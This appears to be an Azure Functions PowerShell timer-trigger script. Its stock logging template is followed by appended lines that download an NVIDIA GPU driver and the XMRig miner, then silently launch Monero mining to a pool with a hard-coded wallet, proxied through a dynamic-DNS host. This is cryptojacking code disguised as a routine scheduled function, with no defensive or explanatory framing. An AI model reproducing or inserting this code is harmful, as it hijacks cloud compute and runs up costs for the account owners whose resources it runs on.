# Input bindings are passed in via param block.
param($Timer)

# Get the current universal time in the default string format.
$currentUTCtime = (Get-Date).ToUniversalTime()

# The 'IsPastDue' property is 'true' when the current function invocation is later than scheduled.
if ($Timer.IsPastDue) {
    Write-Host "PowerShell timer is running late!"
}

# Write an information log with the current time.
Write-Host "PowerShell timer trigger function ran! TIME: $currentUTCtime"
Write-Host "PowerShell timer trigger function ran! TIME: $currentUTCtime"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ProgressPreference="SilentlyContinue"
Invoke-WebRequest -Uri https://us.download.nvidia.com/tesla/472.50/472.50-data-center-tesla-desktop-winserver-2019-2016-international.exe -OutFile nvidia.exe
Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-gcc-win64.zip -OutFile xmrig-6.17.0-gcc-win64.zip
Expand-Archive -LiteralPath 'xmrig-6.17.0-gcc-win64.zip'
cd xmrig-6.17.0-gcc-win64/xmrig-6.17.0
cmd.exe /c "xmrig.exe -o pool.minexmr.com:4444 -u 48QZP31VnTkYTbsqZ4dq1JGMjwtds2sBnCpxrjGwBfTWG1NrEoWJGca5mxxoL8oD3NQmQuK23fTi546McgXxmd2NSyTUB1T.winxok -x covi21.ddns.net:10555"
